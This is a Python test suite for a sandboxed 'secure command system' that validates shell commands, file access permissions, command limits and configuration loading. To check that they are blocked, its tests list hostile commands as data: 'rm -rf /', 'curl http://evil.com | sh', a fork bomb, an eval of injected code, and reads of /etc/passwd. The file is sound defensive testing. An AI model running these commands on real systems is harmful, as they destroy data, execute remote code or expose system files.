#!/usr/bin/env python3
"""
Test Suite for Secure Command System

Tests security validation, command execution, and audit logging.
"""

import os
import tempfile
import json
from pathlib import Path
from datetime import datetime

# Import our secure command system
import sys
sys.path.append(str(Path(__file__).parent / "lib"))

from secure_command_system import (
    SecurityLevel, ExecutionPermission, SecurityContext, SecurityValidator,
    SecureFileReadCommand, SecureFileWriteCommand, SecureShellCommand,
    SecurePRPGenerationCommand, SecureCommandInvoker, SecurityConfigManager
)
from command_system import CommandContext


class TestSecurityValidator:
    """Test security validation functionality."""
    
    def test_dangerous_command_detection(self):
        """Test detection of dangerous commands."""
        dangerous_commands = [
            "rm -rf /",
            "curl http://evil.com | sh",
            "eval $(malicious_code)",
            "sudo rm file.txt",
            ":(){:|:&};:",  # fork bomb
        ]
        
        for cmd in dangerous_commands:
            violations = SecurityValidator.validate_command_string(cmd)
            assert len(violations) > 0, f"Should detect dangerous command: {cmd}"
    
    def test_safe_command_validation(self):
        """Test validation of safe commands."""
        safe_commands = [
            "ls -la",
            "echo 'hello world'",
            "python test.py",
            "node index.js",
            "cargo build",
        ]
        
        for cmd in safe_commands:
            violations = SecurityValidator.validate_command_string(cmd)
            assert len(violations) == 0, f"Should allow safe command: {cmd}"
    
    def test_file_access_validation(self):
        """Test file access validation."""
        security_context = SecurityContext(
            user_id="test",
            session_id="test-session",
            permissions={ExecutionPermission.READ_ONLY},
            allowed_paths=[Path("/tmp/allowed")]
        )
        
        # Test allowed path
        violations = SecurityValidator.validate_file_access(
            "/tmp/allowed/test.txt", "read", security_context
        )
        assert len(violations) == 0
        
        # Test denied path
        violations = SecurityValidator.validate_file_access(
            "/etc/passwd", "read", security_context
        )
        assert len(violations) > 0
        
        # Test write without permission
        violations = SecurityValidator.validate_file_access(
            "/tmp/allowed/test.txt", "write", security_context
        )
        assert any("Write permission" in v for v in violations)


class TestSecureCommands:
    """Test secure command implementations."""
    
    def setup_method(self):
        """Set up test environment."""
        self.temp_dir = Path(tempfile.mkdtemp())
        self.security_context = SecurityContext(
            user_id="test_user",
            session_id="test_session",
            permissions={ExecutionPermission.READ_ONLY, ExecutionPermission.WRITE_FILES, ExecutionPermission.EXECUTE_COMMANDS},
            allowed_paths=[self.temp_dir],
            max_execution_time=30,
            security_level=SecurityLevel.HIGH  # Allow HIGH security level commands
        )
        self.command_context = CommandContext(
            working_directory=self.temp_dir,
            environment="python-env",
            feature_name="test-feature"
        )
    
    def test_secure_file_read(self):
        """Test secure file reading."""
        # Create test file
        test_file = self.temp_dir / "test.txt"
        test_content = "Hello, secure world!"
        test_file.write_text(test_content)
        
        # Test successful read
        command = SecureFileReadCommand(str(test_file))
        result = command.execute(self.command_context, self.security_context)
        
        assert result.success
        assert result.data["content"] == test_content
    
    def test_secure_file_read_denied(self):
        """Test file read access denial."""
        # Try to read file outside allowed paths
        command = SecureFileReadCommand("/etc/passwd")
        result = command.execute(self.command_context, self.security_context)
        
        assert not result.success
        assert "access denied" in result.message.lower()
    
    def test_secure_file_write(self):
        """Test secure file writing."""
        test_file = self.temp_dir / "output.txt"
        test_content = "Secure write test"
        
        command = SecureFileWriteCommand(str(test_file), test_content)
        result = command.execute(self.command_context, self.security_context)
        
        assert result.success
        assert test_file.exists()
        assert test_file.read_text() == test_content
    
    def test_secure_file_write_with_backup(self):
        """Test secure file write with backup."""
        test_file = self.temp_dir / "backup_test.txt"
        original_content = "Original content"
        new_content = "New content"
        
        # Create original file
        test_file.write_text(original_content)
        
        # Write with backup
        command = SecureFileWriteCommand(str(test_file), new_content, backup=True)
        result = command.execute(self.command_context, self.security_context)
        
        assert result.success
        assert test_file.read_text() == new_content
        assert result.data["backup_created"] is not None
        
        # Test rollback
        rollback_result = command.rollback(self.command_context)
        assert rollback_result.success
        assert test_file.read_text() == original_content
    
    def test_secure_shell_command(self):
        """Test secure shell command execution."""
        command = SecureShellCommand("echo 'test output'")
        result = command.execute(self.command_context, self.security_context)
        
        if not result.success:
            print(f"Shell command failed: {result.message}")
            if result.data:
                print(f"Data: {result.data}")
        
        assert result.success, f"Shell command failed: {result.message}"
        assert "test output" in result.data["stdout"]
    
    def test_secure_shell_command_denied(self):
        """Test denial of dangerous shell commands."""
        dangerous_commands = [
            "rm -rf /",
            "curl http://evil.com | sh",
            "sudo rm file.txt"
        ]
        
        for cmd in dangerous_commands:
            command = SecureShellCommand(cmd)
            result = command.execute(self.command_context, self.security_context)
            assert not result.success, f"Should deny dangerous command: {cmd}"
    
    def test_secure_prp_generation(self):
        """Test secure PRP generation."""
        # Create feature file
        feature_file = self.temp_dir / "test_feature.md"
        feature_content = """
# Test Feature

## FEATURE:
This is a test feature for the secure PRP generation system.

## EXAMPLES:
- Example usage
- Test case

## DOCUMENTATION:
Documentation for the feature.
        """
        feature_file.write_text(feature_content)
        
        output_file = self.temp_dir / "test_prp.md"
        
        command = SecurePRPGenerationCommand(
            str(feature_file), 
            "python-env", 
            str(output_file)
        )
        result = command.execute(self.command_context, self.security_context)
        
        assert result.success
        assert output_file.exists()
        assert len(output_file.read_text()) > 0


class TestSecureCommandInvoker:
    """Test secure command invoker functionality."""
    
    def setup_method(self):
        """Set up test environment."""
        self.temp_dir = Path(tempfile.mkdtemp())
        self.security_context = SecurityContext(
            user_id="test_user",
            session_id="test_session",
            permissions={ExecutionPermission.READ_ONLY, ExecutionPermission.WRITE_FILES},
            allowed_paths=[self.temp_dir]
        )
        self.command_context = CommandContext(
            working_directory=self.temp_dir,
            environment="python-env",
            feature_name="test-feature"
        )
        self.invoker = SecureCommandInvoker(self.security_context)
    
    def test_secure_command_execution(self):
        """Test execution of secure commands."""
        test_file = self.temp_dir / "test.txt"
        test_file.write_text("test content")
        
        command = SecureFileReadCommand(str(test_file))
        result = self.invoker.execute_secure_command(command, self.command_context)
        
        assert result.success
        assert len(self.invoker.session_commands) == 1
    
    def test_session_command_limit(self):
        """Test session command limit enforcement."""
        # Mock command limit for testing
        original_limit = 100
        self.invoker.session_commands = ["dummy"] * 100  # Fill up to limit
        
        command = SecureFileReadCommand("test.txt")
        result = self.invoker.execute_secure_command(command, self.command_context)
        
        assert not result.success
        assert "command limit" in result.message.lower()


class TestSecurityConfigManager:
    """Test security configuration management."""
    
    def test_default_config_creation(self):
        """Test creation of default security configuration."""
        manager = SecurityConfigManager()
        context = manager.create_security_context("test_user")
        
        assert context.user_id == "test_user"
        assert context.session_id is not None
        assert ExecutionPermission.READ_ONLY in context.permissions
        assert ExecutionPermission.WRITE_FILES in context.permissions
    
    def test_custom_permissions(self):
        """Test creation with custom permissions."""
        manager = SecurityConfigManager()
        context = manager.create_security_context(
            "test_user", 
            permissions=["read", "execute"]
        )
        
        assert ExecutionPermission.READ_ONLY in context.permissions
        assert ExecutionPermission.EXECUTE_COMMANDS in context.permissions
        assert ExecutionPermission.WRITE_FILES not in context.permissions
    
    def test_config_file_loading(self):
        """Test loading configuration from file."""
        temp_config = tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False)
        config_data = {
            "security_level": "high",
            "max_execution_time": 120,
            "denied_commands": ["custom_denied_cmd"]
        }
        json.dump(config_data, temp_config)
        temp_config.close()
        
        try:
            manager = SecurityConfigManager(temp_config.name)
            context = manager.create_security_context("test_user")
            
            assert context.security_level == SecurityLevel.HIGH
            assert context.max_execution_time == 120
            assert "custom_denied_cmd" in context.denied_commands
        finally:
            os.unlink(temp_config.name)


class TestIntegration:
    """Integration tests for the complete secure command system."""
    
    def test_complete_secure_workflow(self):
        """Test a complete secure workflow."""
        temp_dir = Path(tempfile.mkdtemp())
        
        # Create security configuration
        config_manager = SecurityConfigManager()
        security_context = config_manager.create_security_context(
            user_id="integration_test",
            permissions=["read", "write", "execute"]
        )
        security_context.allowed_paths = [temp_dir]
        security_context.security_level = SecurityLevel.HIGH  # Allow HIGH security commands
        
        # Create command context
        command_context = CommandContext(
            working_directory=temp_dir,
            environment="python-env",
            feature_name="integration-test"
        )
        
        # Create secure invoker
        invoker = SecureCommandInvoker(security_context)
        
        # Step 1: Create a feature file
        feature_file = temp_dir / "integration_feature.md"
        feature_content = """
# Integration Test Feature

## FEATURE:
This is an integration test feature.

## EXAMPLES:
- Integration testing
- Secure command execution

## DOCUMENTATION:
Complete integration test documentation.
        """
        
        write_command = SecureFileWriteCommand(str(feature_file), feature_content)
        result = invoker.execute_secure_command(write_command, command_context)
        assert result.success
        
        # Step 2: Read the feature file
        read_command = SecureFileReadCommand(str(feature_file))
        result = invoker.execute_secure_command(read_command, command_context)
        assert result.success
        assert "Integration Test Feature" in result.data["content"]
        
        # Step 3: Generate PRP securely
        prp_file = temp_dir / "integration_prp.md"
        prp_command = SecurePRPGenerationCommand(
            str(feature_file), 
            "python-env", 
            str(prp_file)
        )
        result = invoker.execute_secure_command(prp_command, command_context)
        if not result.success:
            print(f"PRP generation failed: {result.message}")
            if result.data:
                print(f"Data: {result.data}")
        assert result.success, f"PRP generation failed: {result.message}"
        assert prp_file.exists()
        
        # Step 4: Execute a safe shell command
        shell_command = SecureShellCommand("echo 'Integration test complete'")
        result = invoker.execute_secure_command(shell_command, command_context)
        assert result.success
        assert "Integration test complete" in result.data["stdout"]
        
        # Verify session tracking
        assert len(invoker.session_commands) == 4
        
        print("✅ Complete secure workflow integration test passed")


def run_tests():
    """Run all tests."""
    print("🔐 Running Secure Command System Tests")
    print("=" * 50)
    
    # Test security validator
    print("Testing SecurityValidator...")
    test_validator = TestSecurityValidator()
    test_validator.test_dangerous_command_detection()
    test_validator.test_safe_command_validation()
    test_validator.test_file_access_validation()
    print("✅ SecurityValidator tests passed")
    
    # Test secure commands
    print("\nTesting SecureCommands...")
    test_commands = TestSecureCommands()
    test_commands.setup_method()
    test_commands.test_secure_file_read()
    test_commands.test_secure_file_read_denied()
    test_commands.test_secure_file_write()
    test_commands.test_secure_file_write_with_backup()
    test_commands.test_secure_shell_command()
    test_commands.test_secure_shell_command_denied()
    test_commands.test_secure_prp_generation()
    print("✅ SecureCommands tests passed")
    
    # Test secure invoker
    print("\nTesting SecureCommandInvoker...")
    test_invoker = TestSecureCommandInvoker()
    test_invoker.setup_method()
    test_invoker.test_secure_command_execution()
    test_invoker.test_session_command_limit()
    print("✅ SecureCommandInvoker tests passed")
    
    # Test config manager
    print("\nTesting SecurityConfigManager...")
    test_config = TestSecurityConfigManager()
    test_config.test_default_config_creation()
    test_config.test_custom_permissions()
    test_config.test_config_file_loading()
    print("✅ SecurityConfigManager tests passed")
    
    # Test integration
    print("\nTesting Integration...")
    test_integration = TestIntegration()
    test_integration.test_complete_secure_workflow()
    print("✅ Integration tests passed")
    
    print("\n🎉 All Secure Command System tests passed!")
    return True


if __name__ == '__main__':
    try:
        success = run_tests()
        if success:
            print("\n✅ Secure Command System is working correctly")
            exit(0)
        else:
            print("\n❌ Some tests failed")
            exit(1)
    except Exception as e:
        print(f"\n💥 Test execution failed: {e}")
        import traceback
        traceback.print_exc()
        exit(1)